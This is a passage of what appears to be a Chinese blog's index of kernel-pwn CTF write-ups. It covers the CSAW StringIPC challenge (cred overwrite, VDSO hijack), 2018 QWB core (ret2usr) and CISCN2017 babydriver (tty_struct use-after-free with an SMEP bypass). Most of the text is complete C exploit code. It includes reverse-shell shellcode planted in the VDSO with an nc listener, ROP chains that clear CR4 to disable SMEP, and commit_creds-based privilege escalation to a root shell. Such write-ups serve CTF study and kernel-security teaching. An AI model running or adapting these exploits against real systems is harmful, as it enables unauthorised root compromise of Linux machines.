VMALLOC_SIZE_TB)        |+++++++++++++|0xffffc90000000000  ---+-----------+------------| VMALLOC_START |------------------|+++++++++++++|    1T                 |           | hole                                          |+++++++++++++|0xffffc80000000000  ---+-----------+-----------------------------------------------|+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|    64T                |           | direct mapping of all phys. memory            |+++++++++++++|                       |           | (1 &lt;&lt; MAX_PHYSMEM_BITS)                       |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|                       |           |                                               |+++++++++++++|0xffff880000000000 ----+-----------+-----------| __PAGE_OFFSET_BASE | -------------|+++++++++++++|                       |           |                                               |+++++++++++++|    8T                 |           | guard hole, reserved for hypervisor           |+++++++++++++|                       |           |                                               |+++++++++++++|0xffff800000000000 ----+-----------+-----------------------------------------------+-------------+                       |-----------|                                               |-------------|                       |-----------| hole caused by [48:63] sign extension         |-------------|                       |-----------|                                               |-------------|0x0000800000000000 ----+-----------+-----------------------------------------------+-------------+    PAGE_SIZE          |           | guard page                                    |xxxxxxxxxxxxx|0x00007ffffffff000 ----+-----------+--------------| TASK_SIZE_MAX | ---------------|xxxxxxxxxxxxx|                       |           |                                               |  user space |                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|    128T               |           | different per mm                              |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|                       |           |                                               |xxxxxxxxxxxxx|0x0000000000000000 ----+-----------+-----------------------------------------------+-------------+\n\n在0xffff880000000000——0xffffc80000000000区域，是堆的分配区域，因此，我们只需要搜索这段内存，即可找到task_struct结构，进而找到cred结构。\n综上，exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tloff_t index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;int main()&#123;\tint fd = -1;\tint result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffff880000000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tint root_cred[12];\t// set target in task_struct\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tprctl(PR_SET_NAME, target);\tfd = open(&quot;/dev/csaw&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffc80000000000; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tresult = memmem(buf, 0x1000, target, 16);\t\t// printf(&quot;0x%lx&quot;,addr);\t\tif (result)\t\t&#123;\t\t\tcred = *(size_t *)(result - 0x8);\t\t\treal_cred = *(size_t *)(result - 0x10);\t\t\tif ((cred || 0xff00000000000000) &amp;&amp; (real_cred == cred))\t\t\t&#123;\t\t\t\t// printf(&quot;[]%lx[]&quot;,result-(int)(buf));\t\t\t\ttarget_addr = addr + result - (int)(buf);\t\t\t\tprintf(&quot;[+]found task_struct 0x%lx\\n&quot;, target_addr);\t\t\t\tprintf(&quot;[+]found cred 0x%lx\\n&quot;, real_cred);\t\t\t\tbreak;\t\t\t&#125;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tfor (int i = 0; i &lt; 44; i++)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = cred - 0x10 + 4 + i;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\troot_cred[0] = 0;\t\twrite_args.id = alloc_args.id;\t\twrite_args.buf = (char *)root_cred;\t\twrite_args.count = 1;\t\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\t&#125;\tif (getuid() == 0)\t&#123;\t\tprintf(&quot;[+]now you are r00t,enjoy ur shell\\n&quot;);\t\tsystem(&quot;/bin/sh&quot;);\t&#125;\telse\t&#123;\t\tputs(&quot;[-] there must be something error ... &quot;);\t\texit(-1);\t&#125;\treturn 0;&#125;\n\n劫持VDSOVDSO就是Virtual Dynamic Shared Object。这个.so文件不在磁盘上，而是在内核里头。内核把包含某.so的内存页在程序启动的时候映射入其内存空间，对应的程序就可以当普通的.so来使用里头的函数。\nvdso里的函数主要有五个\nclock_gettime\t0000000000000A10\tgettimeofday\t0000000000000C80\ttime\t0000000000000DE0\tgetcpu\t0000000000000E00\tstart\t0000000000000940\n\nVDSO所在的页，在内核态是可读、可写的，在用户态是可读、可执行的\n利用方式首先，利用内存读找到内存中vdso的逻辑页，由于内核态有写入的权限，因此利用任意写写入shellcode覆盖其中某些函数。\n其次，等待某root权限的进程调用这个函数就可以利用反弹shell完成提权。\n根据上面的内存映射图，再结合vdso在内核附近，我们可以确定vdso范围0xffffffff80000000——0xffffffffffffefff\n所以思路很明显，在内核中修改函数地址为shellcode就可，所以现在就是怎么找到函数地址\n首先，获得其中gettimeofday字符串到vdso的其实位置的偏移\nint get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\terrExit(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\terrExit(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;\n\n随后在内存映射图中获取的位置进行爆破\nfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)&#123;    seek_args.id = alloc_args.id;    seek_args.index = addr - 0x10;    seek_args.whence = SEEK_SET;    ioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);    read_args.id = alloc_args.id;    read_args.buf = buf;    read_args.count = 0x1000;    ioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);    if ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))    &#123;        result = addr;        printf(&quot;[+] found vdso %lx\\n&quot;, result);        break;    &#125;&#125;\n\n这里是一页一页的搜索并且由于我们知道字符串的偏移，所以我们可以直接进行对比，所以效率还是十分高效的\n接下来就是思考在什么地方写入shellcode了，我们目前是不知道函数的执行代码在哪里，我们可以使用下面的方法拿到vdso.so文件放进ida分析\n\n\n\n可以看到gettimeofday函数的代码段是在偏移为0xc80的地方，所以我们覆盖这里为shellcode即可。\n为什么从一开始就一直说这个gettimeofday函数呢？\n上面说了这一攻击方式需要有一个有root权限的程序去执行这里面的函数，所以我们就需要一个不停的调用vdso内函数的一个程序。\n在真实环境下crontab会不停的调用搞gettimeofday函数，但是题目是qemu的模拟环境所以没有这个程序，但是题目有一个模拟的程序\n#include &lt;stdio.h&gt;int main()&#123;\twhile(1)&#123;\t\tputs(&quot;111&quot;);\t\tsleep(1);\t\tgettimeofday();\t&#125;&#125;\n\n最后综上，得出exp：\n#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#define CSAW_IOCTL_BASE 0x77617363#define CSAW_ALLOC_CHANNEL CSAW_IOCTL_BASE + 1#define CSAW_OPEN_CHANNEL CSAW_IOCTL_BASE + 2#define CSAW_GROW_CHANNEL CSAW_IOCTL_BASE + 3#define CSAW_SHRINK_CHANNEL CSAW_IOCTL_BASE + 4#define CSAW_READ_CHANNEL CSAW_IOCTL_BASE + 5#define CSAW_WRITE_CHANNEL CSAW_IOCTL_BASE + 6#define CSAW_SEEK_CHANNEL CSAW_IOCTL_BASE + 7#define CSAW_CLOSE_CHANNEL CSAW_IOCTL_BASE + 8struct alloc_channel_args&#123;\tsize_t buf_size;\tint id;&#125;;struct open_channel_args&#123;\tint id;&#125;;struct shrink_channel_args&#123;\tint id;\tsize_t size;&#125;;struct read_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct write_channel_args&#123;\tint id;\tchar *buf;\tsize_t count;&#125;;struct seek_channel_args&#123;\tint id;\tlong int index;\tint whence;&#125;;struct close_channel_args&#123;\tint id;&#125;;void print_hex(char *buf, size_t len)&#123;\tint i;\tfor (i = 0; i &lt; ((len / 8) * 8); i += 8)\t&#123;\t\tprintf(&quot;0x%lx&quot;, *(size_t *)(buf + i));\t\tif (i % 16)\t\t\tprintf(&quot; &quot;);\t\telse\t\t\tprintf(&quot;\\n&quot;);\t&#125;&#125;void show_vdso_userspace(int len)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn;\t&#125;\tfor (int i = len; i &lt; 0x1000; i++)\t&#123;\t\tprintf(&quot;%x &quot;, *(char *)(addr + i));\t&#125;&#125;int check_vsdo_shellcode(char *shellcode)&#123;\tsize_t addr = 0;\taddr = getauxval(AT_SYSINFO_EHDR);\tprintf(&quot;vdso:%lx\\n&quot;, addr);\tif (addr &lt; 0)\t&#123;\t\tputs(&quot;[-]cannot get vdso addr&quot;);\t\treturn 0;\t&#125;\tif (memmem((char *)addr, 0x1000, shellcode, strlen(shellcode)))\t&#123;\t\treturn 1;\t&#125;\treturn 0;&#125;int get_gettimeofday_str_offset()&#123;\tsize_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\tchar *name = &quot;gettimeofday&quot;;\tif (!vdso_addr)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\tsize_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\tif (name_addr &lt; 0)\t&#123;\t\tprintf(&quot;[-]error get name&#x27;s offset&quot;);\t&#125;\treturn name_addr - vdso_addr;&#125;int main()&#123;\tint fd = -1;\tsize_t result = 0;\tstruct alloc_channel_args alloc_args;\tstruct shrink_channel_args shrink_args;\tstruct seek_channel_args seek_args;\tstruct read_channel_args read_args;\tstruct close_channel_args close_args;\tstruct write_channel_args write_args;\tsize_t addr = 0xffffffff80000000;\tsize_t real_cred = 0;\tsize_t cred = 0;\tsize_t target_addr;\tint root_cred[12];\tint offset;\tchar shellcode[] = &quot;\\x90\\x53\\x48\\x31\\xC0\\xB0\\x66\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xC3\\x75\\x0F\\x48\\x31\\xC0\\xB0\\x39\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x09\\x5B\\x48\\x31\\xC0\\xB0\\x60\\x0F\\x05\\xC3\\x48\\x31\\xD2\\x6A\\x01\\x5E\\x6A\\x02\\x5F\\x6A\\x29\\x58\\x0F\\x05\\x48\\x97\\x50\\x48\\xB9\\xFD\\xFF\\xF2\\xFA\\x80\\xFF\\xFF\\xFE\\x48\\xF7\\xD1\\x51\\x48\\x89\\xE6\\x6A\\x10\\x5A\\x6A\\x2A\\x58\\x0F\\x05\\x48\\x31\\xDB\\x48\\x39\\xD8\\x74\\x07\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05\\x90\\x6A\\x03\\x5E\\x6A\\x21\\x58\\x48\\xFF\\xCE\\x0F\\x05\\x75\\xF6\\x48\\x31\\xC0\\x50\\x48\\xBB\\xD0\\x9D\\x96\\x91\\xD0\\x8C\\x97\\xFF\\x48\\xF7\\xD3\\x53\\x48\\x89\\xE7\\x50\\x57\\x48\\x89\\xE6\\x48\\x31\\xD2\\xB0\\x3B\\x0F\\x05\\x48\\x31\\xC0\\xB0\\xE7\\x0F\\x05&quot;;\toffset = get_gettimeofday_str_offset();\tprintf(&quot;gettimeofday str in vdso.so offset=0x%x\\n&quot;, offset);\tsetvbuf(stdout, 0LL, 2, 0LL);\tchar *buf = malloc(0x1000);\tchar target[16];\tstrcpy(target, &quot;trytofind196082&quot;);\tprctl(PR_SET_NAME, target);\tfd = open(&quot;/dev/csaw&quot;, O_RDWR);\tif (fd &lt; 0)\t&#123;\t\tputs(&quot;[-] open error&quot;);\t\texit(-1);\t&#125;\talloc_args.buf_size = 0x100;\talloc_args.id = -1;\tioctl(fd, CSAW_ALLOC_CHANNEL, &amp;alloc_args);\tif (alloc_args.id == -1)\t&#123;\t\tputs(&quot;[-] alloc_channel error&quot;);\t\texit(-1);\t&#125;\tprintf(&quot;[+] now we get a channel %d\\n&quot;, alloc_args.id);\tshrink_args.id = alloc_args.id;\tshrink_args.size = 0x100 + 1;\tioctl(fd, CSAW_SHRINK_CHANNEL, &amp;shrink_args);\tputs(&quot;[+] we can read and write any momery&quot;);\tfor (; addr &lt; 0xffffffffffffefff; addr += 0x1000)\t&#123;\t\tseek_args.id = alloc_args.id;\t\tseek_args.index = addr - 0x10;\t\tseek_args.whence = SEEK_SET;\t\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\t\tread_args.id = alloc_args.id;\t\tread_args.buf = buf;\t\tread_args.count = 0x1000;\t\tioctl(fd, CSAW_READ_CHANNEL, &amp;read_args);\t\tif ((!strcmp(&quot;gettimeofday&quot;, buf + offset)))\t\t&#123;\t\t\tresult = addr;\t\t\tprintf(&quot;[+] found vdso %lx\\n&quot;, result);\t\t\tbreak;\t\t&#125;\t&#125;\tif (result == 0)\t&#123;\t\tputs(&quot;not found , try again &quot;);\t\texit(-1);\t&#125;\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\tseek_args.id = alloc_args.id;\tseek_args.index = result - 0x10 + 0xc80;\tseek_args.whence = SEEK_SET;\tioctl(fd, CSAW_SEEK_CHANNEL, &amp;seek_args);\twrite_args.id = alloc_args.id;\twrite_args.buf = shellcode;\twrite_args.count = strlen(shellcode);\tioctl(fd, CSAW_WRITE_CHANNEL, &amp;write_args);\tif (check_vsdo_shellcode(shellcode) != 0)\t&#123;\t\tputs(&quot;[+] shellcode is written into vdso, waiting for a reverse shell :&quot;);\t\tif (fork() == 0)\t\t&#123;\t\t\tprintf(&quot;gettimeofday\\n&quot;);\t\t\tsleep(1);\t\t\tvoid (*gettimeofday_addr)();\t\t\tgettimeofday_addr = 0xc80 + getauxval(AT_SYSINFO_EHDR);\t\t\tgettimeofday_addr();\t\t\texit(-1);\t\t&#125;\t\tsystem(&quot;nc -lp 3333&quot;);\t&#125;\telse\t&#123;\t\tputs(&quot;[-] someting wrong ... &quot;);\t\texit(-1);\t&#125;\tioctl(fd, CSAW_CLOSE_CHANNEL, &amp;close_args);\treturn 0;&#125;\n\nexp使用的shellcode为：https://gist.github.com/itsZN/1ab36391d1849f15b785\n\n参考链接：http://p4nda.top/2018/11/07/stringipc/#2-%E5%8A%AB%E6%8C%81VDSO\n","categories":["kernel-pwn"],"tags":["修改cred，劫持vdso"]},{"title":"kernel pwn基础[1]","url":"/2022/03/22/kernel-pwn%E5%9F%BA%E7%A1%80-1/","content":"这里的例题仍然是上一篇的两个例题，不过使用不同的解法。\n2018 强网杯 - core上一篇里这道题使用的方法是ROP，不过这一方法相对来说比较麻烦，构造ROP链挺恼火的。\n\n可以看到并没有打开smep所以可以直接实现ret2usr。\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;size_t raw_vmlinux_base = 0xffffffff81000000;size_t commit_creds = 0, prepare_kernel_cred = 0, vmlinux_base = 0;void find_symbols()&#123;    FILE *file = fopen(&quot;/tmp/kallsyms&quot;, &quot;r&quot;);    if (file &lt; 0)    &#123;        puts(&quot;[*]open kallsyms error!&quot;);        exit(0);    &#125;    char buf[0x30] = &#123;0&#125;;    while (fgets(buf, 0x30, file))    &#123;        if (commit_creds &amp; prepare_kernel_cred)            return;        if (strstr(buf, &quot;commit_creds&quot;) &amp;&amp; !commit_creds)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;commit_creds);            printf(&quot;commit_creds addr: %p\\n&quot;, commit_creds);            vmlinux_base = commit_creds - 0x9c8e0;            printf(&quot;vmlinux_base addr: %p\\n&quot;, vmlinux_base);        &#125;        if (strstr(buf, &quot;prepare_kernel_cred&quot;) &amp;&amp; !prepare_kernel_cred)        &#123;            char hex[20] = &#123;0&#125;;            strncpy(hex, buf, 16);            sscanf(hex, &quot;%llx&quot;, &amp;prepare_kernel_cred);            printf(&quot;prepare_kernel_cred addr: %p\\n&quot;, prepare_kernel_cred);        &#125;    &#125;    if (!(prepare_kernel_cred &amp; commit_creds))    &#123;        puts(&quot;[*]Error!&quot;);        exit(0);    &#125;&#125;void get_root()&#123;    char *(*pkc)(int) = prepare_kernel_cred;    void (*cc)(char *) = commit_creds;    (*cc)((*pkc)(0));&#125;void get_shell()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;int main()&#123;    save_status();    int fd = open(&quot;/proc/core&quot;, 2);    if (fd &lt; 0)    &#123;        puts(&quot;[*]open /proc/core error!&quot;);        exit(0);    &#125;    find_symbols();    ssize_t offset = vmlinux_base - raw_vmlinux_base;    ioctl(fd, 0x6677889C, 0x40);    char buf[0x30] = &#123;0&#125;;    ioctl(fd, 0x6677889B, buf);    size_t canary = ((size_t *)buf)[0];    size_t payload[0x1000] = &#123;0&#125;;    int i;    for (i = 0; i &lt; 10; i++)    &#123;        payload[i] = canary;    &#125;    payload[i++] = (size_t)get_root;    payload[i++] = 0xffffffff81a012da + offset; // swapgs; popfq; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff81050ac2 + offset; // iretq; ret;    payload[i++] = (size_t)get_shell;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    write(fd, payload, 0x800);    ioctl(fd, 0x6677889A, 0xffffffffffff0100);&#125;\n\n可以看到这里的payload少了很多\nCISCN2017 - babydriver首先不是用之前的方法需要一定的前置知识\nsmep为了防止 ret2usr 攻击，内核开发者提出了 smep 保护，smep 全称 Supervisor Mode Execution Protection，是内核的一种保护措施，作用是当 CPU 处于 ring0 模式时，执行 用户空间的代码 会触发页错误；这个保护在 arm 中被称为 PXN。\n\n可以看到这里是打开了smep保护的。\n系统其实是根据CR4寄存器来判断是否开启smep保护，当smep位为1代表开启，反之就是关闭。所以我们只需要可以控制这里值的gadget即可。一般是采用固定的值放入CR4寄存器mov cr4, 0x6f0\n解题思路这里不使用第一种方式的话，思路大概就是先关闭smep保护，然后ret2usr。\n首先是通过UAF控制一个tty_struct结构：\nstruct tty_struct &#123;    int magic;    struct kref kref;    struct device *dev;    struct tty_driver *driver;    const struct tty_operations *ops;    int index;    /* Protects ldisc changes: Lock tty not pty */    struct ld_semaphore ldisc_sem;    struct tty_ldisc *ldisc;    struct mutex atomic_write_lock;    struct mutex legacy_mutex;    struct mutex throttle_mutex;    struct rw_semaphore termios_rwsem;    struct mutex winsize_mutex;    spinlock_t ctrl_lock;    spinlock_t flow_lock;    /* Termios values are protected by the termios rwsem */    struct ktermios termios, termios_locked;    struct termiox *termiox;    /* May be NULL for unsupported */    char name[64];    struct pid *pgrp;       /* Protected by ctrl lock */    struct pid *session;    unsigned long flags;    int count;    struct winsize winsize;     /* winsize_mutex */    unsigned long stopped:1,    /* flow_lock */              flow_stopped:1,              unused:BITS_PER_LONG - 2;    int hw_stopped;    unsigned long ctrl_status:8,    /* ctrl_lock */              packet:1,              unused_ctrl:BITS_PER_LONG - 9;    unsigned int receive_room;  /* Bytes free for queue */    int flow_change;    struct tty_struct *link;    struct fasync_struct *fasync;    wait_queue_head_t write_wait;    wait_queue_head_t read_wait;    struct work_struct hangup_work;    void *disc_data;    void *driver_data;    spinlock_t files_lock;      /* protects tty_files list */    struct list_head tty_files;#define N_TTY_BUF_SIZE 4096    int closing;    unsigned char *write_buf;    int write_cnt;    /* If the tty has a pending do_SAK, queue it here - akpm */    struct work_struct SAK_work;    struct tty_port *port;&#125; __randomize_layout;\n\n在这个结构体的有另一个结构体const struct tty_operations *ops;：\nstruct tty_operations &#123;    struct tty_struct * (*lookup)(struct tty_driver *driver,            struct file *filp, int idx);    int  (*install)(struct tty_driver *driver, struct tty_struct *tty);    void (*remove)(struct tty_driver *driver, struct tty_struct *tty);    int  (*open)(struct tty_struct * tty, struct file * filp);    void (*close)(struct tty_struct * tty, struct file * filp);    void (*shutdown)(struct tty_struct *tty);    void (*cleanup)(struct tty_struct *tty);    int  (*write)(struct tty_struct * tty,              const unsigned char *buf, int count);    int  (*put_char)(struct tty_struct *tty, unsigned char ch);    void (*flush_chars)(struct tty_struct *tty);    int  (*write_room)(struct tty_struct *tty);    int  (*chars_in_buffer)(struct tty_struct *tty);    int  (*ioctl)(struct tty_struct *tty,            unsigned int cmd, unsigned long arg);    long (*compat_ioctl)(struct tty_struct *tty,                 unsigned int cmd, unsigned long arg);    void (*set_termios)(struct tty_struct *tty, struct ktermios * old);    void (*throttle)(struct tty_struct * tty);    void (*unthrottle)(struct tty_struct * tty);    void (*stop)(struct tty_struct *tty);    void (*start)(struct tty_struct *tty);    void (*hangup)(struct tty_struct *tty);    int (*break_ctl)(struct tty_struct *tty, int state);    void (*flush_buffer)(struct tty_struct *tty);    void (*set_ldisc)(struct tty_struct *tty);    void (*wait_until_sent)(struct tty_struct *tty, int timeout);    void (*send_xchar)(struct tty_struct *tty, char ch);    int (*tiocmget)(struct tty_struct *tty);    int (*tiocmset)(struct tty_struct *tty,            unsigned int set, unsigned int clear);    int (*resize)(struct tty_struct *tty, struct winsize *ws);    int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);    int (*get_icount)(struct tty_struct *tty,                struct serial_icounter_struct *icount);    void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);#ifdef CONFIG_CONSOLE_POLL    int (*poll_init)(struct tty_driver *driver, int line, char *options);    int (*poll_get_char)(struct tty_driver *driver, int line);    void (*poll_put_char)(struct tty_driver *driver, int line, char ch);#endif    int (*proc_show)(struct seq_file *, void *);&#125; __randomize_layout;\n\n可以看到这里面存在许多的函数地址指针，有之前堆的基础的就可以想到这是类似与控制vtable然后伪造函数指针来劫持程序执行流。\n不过不同的是，我们在堆中使用的是one_gadget，但是这里我们是把获得root的payload放在栈上，但是内核态的sp并不指向我们存放的payload的地址，所以动态调试看一下如何解决。\nsize_t fake_tty_operations[30] = &#123;    0xffffffff810d238d, // pop rdi; ret;    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d,    0xffffffff810d238d&#125;;int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);ioctl(fd1, 0x10001, 0x2e0); // 0x2e0是tty_struct结构体的sizeclose(fd1);int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);size_t fake_tty_struct[4] = &#123;0&#125;;read(fd2, fake_tty_struct, 32);fake_tty_struct[3] = (size_t)fake_tty_operations;write(fd2, fake_tty_struct, 32);char buf[8] = &#123;0&#125;;write(fd_tty, buf, 8);\n\n\n\n可以看到在执行到我们构造的加指针位置时的rax是指向我们构造的fake_tty_operations结构体。\n然后就是寻在gadget，不过实现rsp的转移，这里找gadget不能直接在ropper出来的内容里找，因为这不是常规的gadget所以里面不存在\ntcdy@arch-linux ~/Downloads/study_kernel % objdump -d vmlinux &gt; gadget2.txt\n\n\n\n这是两句拼接在一起的gadget，不过依旧可以正常使用。接着就是做ret2usr即可\nexp#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;fcntl.h&gt;#define prepare_kernel_cred_addr 0xffffffff810a1810#define commit_creds_addr 0xffffffff810a1420size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;void get_shell()&#123;    if (!getuid())    &#123;        puts(&quot;[*] root now!&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[*]spawn shell error!&quot;);    &#125;    exit(0);&#125;void get_root()&#123;    char *(*pkc)(int) = prepare_kernel_cred_addr;    void (*cc)(char *) = commit_creds_addr;    (*cc)((*pkc)(0));&#125;int main()&#123;    save_status();    size_t payload[32] = &#123;0&#125;;    int i = 0;    payload[i++] = 0xffffffff810d238d; // pop rdi; ret;    payload[i++] = 0x6f0;    payload[i++] = 0xffffffff81004d80; // mov cr4, rdi; pop rbp; ret;    payload[i++] = 0;    payload[i++] = (size_t)get_root;    payload[i++] = 0xffffffff81063694; // swapgs; pop rbp; ret;    payload[i++] = 0;    payload[i++] = 0xffffffff814e35ef; // iretq; ret;    payload[i++] = (size_t)get_shell;    payload[i++] = user_cs;    payload[i++] = user_rflags;    payload[i++] = user_sp;    payload[i++] = user_ss;    size_t pop_rax = 0xffffffff8100ce6e;    size_t mov_rsp_rax = 0xffffffff8181bfc5;    size_t fake_tty_operations[30] = &#123;        pop_rax,        (size_t)payload,        mov_rsp_rax,        0,        0,        0,        0,        mov_rsp_rax, // write point        0,        0,        0,        0,        0,    &#125;;    int fd1 = open(&quot;/dev/babydev&quot;, O_RDWR);    int fd2 = open(&quot;/dev/babydev&quot;, O_RDWR);    ioctl(fd1, 0x10001, 0x2e0); // 0x2e0是tty_struct结构体的size    close(fd1);    int fd_tty = open(&quot;/dev/ptmx&quot;, O_RDWR | O_NOCTTY);    size_t fake_tty_struct[4] = &#123;0&#125;;    read(fd2, fake_tty_struct, 32);    fake_tty_struct[3] = (size_t)fake_tty_operations;    write(fd2, fake_tty_struct, 32);    char buf[8] = &#123;0&#125;;    write(fd_tty, buf, 8);&#125;\n\n","categories":["kernel-pwn"],"tags":["ret2usr","bypass semp"]},{"title":"kernel pwn基础[2]","url":"/2022/03/24/kernel-pwn%E5%9F%BA%E7%A1%80-2/","content":"2018 0CTF Finals Baby 